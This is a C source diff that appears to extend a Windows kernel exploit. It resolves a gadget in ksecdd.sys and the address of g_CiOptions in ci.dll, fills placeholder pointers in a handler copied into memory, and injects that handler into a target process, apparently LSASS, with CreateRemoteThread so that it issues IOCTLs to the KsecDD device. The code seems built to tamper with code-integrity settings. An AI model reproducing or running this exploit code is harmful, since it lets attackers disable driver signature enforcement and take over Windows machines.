@@ -210,15 +210,34 @@ LPVOID GetDriverBaseAddress(LPSTR DeviceDriverName)
 
 }
 
-int main()
+int main(int argc, char* argv[])
 {
+	REPLACEABLE_POINTER ReplPointers[] = {
+		{ L"kernel32.dll", "DeviceIoControl", (PVOID)0x4343434343434343, NULL},
+		{ L"kernel32.dll", "LocalAlloc", (PVOID)0x3131313131313131, NULL },
+		{ L"kernel32.dll", "LocalFree", (PVOID)0x3232323232323232, NULL },
+		{ L"ntdll.dll", "wcscmp", (PVOID)0x3333333333333333, NULL },
+		{ L"ntdll.dll", "NtQuerySystemInformation", (PVOID)0x4141414141414141, NULL },
+		{ L"ntdll.dll", "NtQueryObject", (PVOID)0x4242424242424242, NULL },
+		{ NULL, NULL, (PVOID)0x2121212121212121, NULL }, // gadget
+		{ NULL, NULL, (PVOID)0x2222222222222222, NULL } // g_cioptions
+	};
 	WINDOWS_VERSION windows_version = WINDOWS_UNSUPPORTED;
-	LPVOID RemoteAlloc = 0;
+	LPVOID RemoteHandler = 0, LocalHandler = 0;
+	SIZE_T szRemoteHandler = (SIZE_T)((PBYTE)LsaKsec_SendIoctl_end - (PBYTE)LsaKsec_SendIoctl);
 	UINT64 ntoskrnl_gadget = 0;
 	UINT64 ci_g_cioptions = 0;
-	HMODULE ntdll = 0;
-	ULONG return_length = 0, szSystemInformationBuffer = sizeof(SYSTEM_HANDLE_INFORMATION), szObjectInformationBuffer = 0;
-	DWORD i = 0;
+	DWORD FakePtrsCount = sizeof(ReplPointers) / sizeof(REPLACEABLE_POINTER), i = 0;
+	HANDLE hProcess = 0, hThread = 0;
+
+
+	DWORD ObjectName[] = { 0x5C004400, 0x65007600, 0x69006300, 0x65005C00, 0x4B007300, 0x65006300,  0x44004400, 0x00006A00 };
+
+	// 4B 73 65 63 44 44
+	DWORD ObjectNameA[] = { 0x7665445c, 0x5c656369, 0x6365734b, 0x00004444 };
+	// 5C 44 65 76 69 63 65
+	DWORD a[] = { 0x7665445c, 0x00656369 };
+	printf("%s\n", (char*)ObjectNameA);
 	
 	windows_version = GetOsBuildNumber();
 	if (windows_version == WINDOWS_UNSUPPORTED)
@@ -226,11 +245,48 @@ int main()
 		return 0;
 	}
 
-	ntoskrnl_gadget = (PUINT64)GetDriverBaseAddress("ksecdd.sys") + NTOSKRNL_GADGET_OFFSET[windows_version];
-	ci_g_cioptions = (PUINT64)GetDriverBaseAddress("ci.dll") + CI_G_CI_OPTIONS_OFFSET[windows_version];
-	
+	ntoskrnl_gadget = (UINT64)((PBYTE)GetDriverBaseAddress("ksecdd.sys") + NTOSKRNL_GADGET_OFFSET[windows_version]);
+	ci_g_cioptions = (UINT64)((PBYTE)GetDriverBaseAddress("ci.dll") + CI_G_CI_OPTIONS_OFFSET[windows_version]);
 
-	
+	if ((ntoskrnl_gadget > NTOSKRNL_GADGET_OFFSET[windows_version]) && (ci_g_cioptions > CI_G_CI_OPTIONS_OFFSET[windows_version]))
+	{
+		for (i = 0; i < FakePtrsCount; i++)
+		{
+			if (ReplPointers[i].FakePtr == (PVOID)0x2121212121212121)
+				(UINT64)ReplPointers[i].RealPtr = ntoskrnl_gadget;
+			if (ReplPointers[i].FakePtr == (PVOID)0x2222222222222222)
+				(UINT64)ReplPointers[i].RealPtr = ci_g_cioptions;
+		}
+	}
+
+	hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, atoi(argv[1]));
+	if (hProcess != INVALID_HANDLE_VALUE)
+	{
+		LocalHandler = (LPVOID)LocalAlloc(LPTR, szRemoteHandler);
+		if (LocalHandler)
+		{
+			RtlCopyMemory(LocalHandler, LsaKsec_SendIoctl, szRemoteHandler);
+			printf("%d\n", (DWORD)szRemoteHandler);
+			printf("0x%-016p\n", (PVOID)LocalHandler);
+			getchar();
+			RemoteHandler = ReplaceFakePointers(hProcess, LocalHandler, (DWORD)szRemoteHandler, (PREPLACEABLE_POINTER)&ReplPointers, FakePtrsCount);
+			if (RemoteHandler)
+			{
+				hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)RemoteHandler, NULL, 0, NULL);
+				if (hThread != INVALID_HANDLE_VALUE)
+				{
+					WaitForSingleObject(hThread, INFINITE);
+					CloseHandle(hThread);
+				}
+
+				VirtualFreeEx(hProcess, RemoteHandler, 0, MEM_RELEASE);
+			}
+			
+			LocalFree(LocalHandler);
+		}
+		
+		CloseHandle(hProcess);
+	}
 
 	return 0;
 }
